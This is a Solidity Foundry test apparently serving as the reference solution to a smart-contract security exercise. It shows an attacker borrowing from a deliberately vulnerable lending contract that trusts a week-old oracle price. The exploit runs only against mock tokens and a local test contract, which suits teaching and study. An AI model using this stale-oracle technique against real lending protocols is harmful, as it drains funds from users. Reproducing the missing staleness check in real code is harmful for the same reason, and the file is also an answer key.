// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../shared/MockERC20.sol";
import {PriceFeed} from "../src/PriceFeed.sol";
import {StaleLending} from "../src/StaleLending.sol";

/// Reference exploit: the feed has gone stale (frozen at an old, high price);
/// the protocol keeps honouring it, so the attacker borrows against bad data.
contract StaleOracleSolution is Test {
    MockERC20 collateral;
    MockERC20 debt;
    PriceFeed feed;
    StaleLending lending;
    address attacker = makeAddr("attacker");

    function setUp() public {
        collateral = new MockERC20("Collateral", "COL");
        debt = new MockERC20("Debt", "DEBT");
        feed = new PriceFeed();
        lending = new StaleLending(collateral, debt, feed);
        debt.mint(address(lending), 1_000_000e18);

        // Price was last updated a week ago at a high value, then the feed stalled.
        feed.set(5_000e8, block.timestamp);
        vm.warp(block.timestamp + 7 days);

        collateral.mint(attacker, 100e18);
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        collateral.approve(address(lending), type(uint256).max);
        uint256 got = lending.borrow(100e18); // accepted despite a 7-day-old price
        vm.stopPrank();

        assertGt(got, 0, "borrow against a stale price should be possible on the vulnerable contract");
        assertEq(debt.balanceOf(attacker), got);
    }
}
